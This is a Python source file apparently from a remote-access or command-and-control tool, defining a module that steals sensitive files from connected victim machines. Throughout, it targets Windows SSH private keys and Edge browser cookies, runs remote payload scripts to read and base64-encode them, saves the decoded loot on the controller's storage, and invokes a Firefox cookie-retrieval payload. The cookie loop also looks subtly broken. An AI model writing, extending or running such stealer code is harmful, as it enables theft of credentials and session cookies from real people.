import base64
import binascii
import logging
import os
import re
import ast

from dataManager.repository.userRepository import UserRepository


class SensitiveFilesModule:

    def __init__(self, user_repository: UserRepository):
        self.module_name = "sensitive_files_module"
        self.user_repository: UserRepository = user_repository

    async def retrieve(self, uuid):
        user = self.user_repository.get_user(uuid)
        FILE_LIST = [
            f"C:\\Users\\{user.username}\\.ssh\\id_rsa",
            f"C:\\Users\\{user.username}\\.ssh\\id_rsa.pub",
            f"C:\\Users\\{user.username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Safe Browsing Cookies",
        ]
        if not user:
            logging.error(f"User with uuid {uuid} not found")
            return {"status": "error", "message": f"User with uuid {uuid} not found"}

        for path in FILE_LIST:
            try:
                await self.retrieve_file(path, user)
            except (FileNotFoundError, ValueError) as e:
                logging.error(f"Error processing {path}: {str(e)}")

        print('')

        cookies = ast.literal_eval(await user.execute(
            "./modules/payloads/payload_retrieve_firefox_cookies.py",
            final_character = b'\0'
        ))

        for cookie in cookies:
            await user.execute(cookie, user, cookies[cookie])

        return {
            "status": "completed",
            "message": f"Sensitive files retrieval for {uuid} completed",
        }

    @staticmethod
    async def retrieve_file(path, user, res = None):
        if not res:
            res = await user.execute(
                "./modules/payloads/sensitiveFiles/retrieve-sensitive-files.py",
                {b"PATH_PLACEHOLDER": path.encode()},
                final_character= b'\0'
            )
            res = res.rstrip('\0')

        if res == "File not found":
            raise FileNotFoundError(f"File {path} not found")

        if res == "File is empty":
            raise ValueError(f"File {path} is empty")

        try:
            decoded = base64.b64decode(res, validate=True)
        except (binascii.Error, ValueError):
            raise ValueError(f"File {path} contains invalid base64 data")

        create_dir = os.path.join(os.getenv('STORAGE_PATH'), 'users', user.uuid)
        if not os.path.exists(create_dir):
            os.makedirs(create_dir)

        safe_path = re.sub(r'[<>:"/\\|?*]', "_", path)
        file_path = os.path.join(create_dir, safe_path)

        with open(file_path, "wb") as f:
            f.write(decoded)


    async def list(self, uuid):
        user = self.user_repository.get_user(uuid)

        if not user:
            logging.error(f"User with uuid {uuid} not found")
            return {"status": "error", "message": f"User with uuid {uuid} not found"}

        listed = ast.literal_eval(await user.execute("./modules/payloads/sensitiveFiles/list-sensitive-files.py"))

        return {key:listed[key] for key in listed if listed[key]}
